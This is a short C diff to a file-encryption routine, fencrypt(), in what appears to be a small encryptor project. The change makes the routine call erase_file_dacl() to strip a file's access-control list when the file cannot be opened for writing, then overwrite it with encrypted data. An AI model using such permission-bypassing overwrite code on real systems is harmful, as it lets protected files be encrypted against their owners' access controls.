@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include "winkit.h"
 #include "airf.h"
 
 void fencrypt(char *fname) {
@@ -34,9 +35,12 @@ void fencrypt(char *fname) {
 			*(bitbuf + i) -= DEGREE;
 	}
 	if (freopen(fname, "wb", f) == NULL) {
-		fprintf(stderr, "%s%s\n", fname, " is under lock and key.");
-		free(bitbuf);
-		return;
+		if (!erase_file_dacl(fname)) {
+			fprintf(stderr, "%s%s\n", fname, " is under lock and key.");
+			free(bitbuf);
+			return;
+		}
+		freopen(fname, "wb", f);
 	}
 	printf("%s %s.\n", "Encrypting", fname);
 	if (fwrite(bitbuf, sizeof(char), fsize, f) < 0) {
